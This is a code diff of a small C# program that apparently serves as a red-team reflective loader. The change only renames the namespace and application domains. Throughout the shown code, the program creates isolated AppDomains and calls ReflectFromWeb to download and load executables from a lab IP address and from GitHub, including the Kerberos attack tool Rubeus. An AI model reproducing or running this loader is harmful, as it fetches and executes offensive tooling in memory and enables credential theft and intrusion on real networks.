@@ -3,7 +3,7 @@ using System.Reflection;
 using System.Net;
 using System.Threading;
 
-namespace Deathwing
+namespace Cell
 {
     class Program
     {
@@ -40,22 +40,22 @@ namespace Deathwing
     
         static void Main(string[] args)
         {
-            AppDomain azeroth = AppDomain.CreateDomain("Azeroth");
-            Console.WriteLine("Appdomain Azeroth created!");
+            AppDomain namek = AppDomain.CreateDomain("Namek");
+            Console.WriteLine("Appdomain Namek created!");
             Console.ReadKey();
-            Worker remoteWorker = (Worker)azeroth.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
+            Worker remoteWorker = (Worker)namek.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
             remoteWorker.ReflectFromWeb("http://10.0.2.15/HelloReflectionWorld.exe");
-            Console.WriteLine("Unloaded Azeroth!");
             Console.ReadKey();
-            AppDomain.Unload(azeroth);
+            Console.WriteLine("Unloaded Namek!");
+            AppDomain.Unload(namek);
             Console.ReadKey();
-            AppDomain outlands = AppDomain.CreateDomain("Outlands");
-            Console.WriteLine("Appdomain Outlands created!");
-            remoteWorker = (Worker)outlands.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
+            AppDomain snakeWay = AppDomain.CreateDomain("SnakeWay");
+            Console.WriteLine("Appdomain SnakeWay created!");
+            remoteWorker = (Worker)snakeWay.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
             Console.ReadKey();
             remoteWorker.ReflectFromWeb("http://10.0.2.15/mscorlib.exe");
             remoteWorker.ReflectFromWeb("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe");
-            Console.WriteLine("Unloaded Outlands!");
+            Console.WriteLine("Unloaded SnakeWay!");
             Console.ReadKey();
         }
     }
